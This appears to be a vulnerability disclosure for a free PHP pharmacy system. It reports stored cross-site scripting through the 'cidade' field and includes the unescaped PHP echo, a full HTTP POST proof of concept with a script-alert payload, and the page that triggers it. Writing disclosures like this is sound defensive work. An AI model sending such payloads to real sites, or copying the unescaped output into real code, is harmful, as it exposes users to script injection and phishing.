# farmacia-in-php has Cross Site Scripting vulnerability in editar-fornecedor.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
editar-fornecedor.php and cidade parameter.

## describe

The vulnerability of cross-site scripting attack in the system is editar-fornecedor.php file. The parameter that can be controlled is: cidade.Exploit vulnerabilities can be phishing

**Code analysis**    

echo cidade in no filter in editar-fornecedor.php

```
                <input type="text " required type="text" class="form-control" name="cidade" placeholder="Digite a cidade" value="<?php echo $fornecedor['cidade'];?>">

```

![image-20241127230312506](https://github.com/user-attachments/assets/fb2e939f-f1bc-433a-a7ad-d4be86adb857)

## POC

```
POST /adicionar-fornecedor.php HTTP/1.1
Host: farmacia-master
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------325896903226182786013199620887
Content-Length: 1455
Origin: http://farmacia-master
Connection: close
Referer: http://farmacia-master/adicionar-fornecedor.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="nome"

1
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="cpf"

1
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="inscricao"

1
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="endereco"

11
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="numero"

1
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="bairro"

1
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="cidade"

"><script>alert('xss1');</script>
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="cep"

1
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="uf"

1
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="telefone"

1
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="email"

1@outlook.com
-----------------------------325896903226182786013199620887
Content-Disposition: form-data; name="acao"


-----------------------------325896903226182786013199620887--

```

![image-20241127152349559](https://github.com/user-attachments/assets/a4e52714-f774-44f8-9c32-bff2788c7af2)

The browser accesses this URL

```
http://farmacia/editar-fornecedor.php?id=8
```

**Result**

![image-20241127152308220](https://github.com/user-attachments/assets/d7200dba-f808-4dce-bb7b-b25914b03a1d)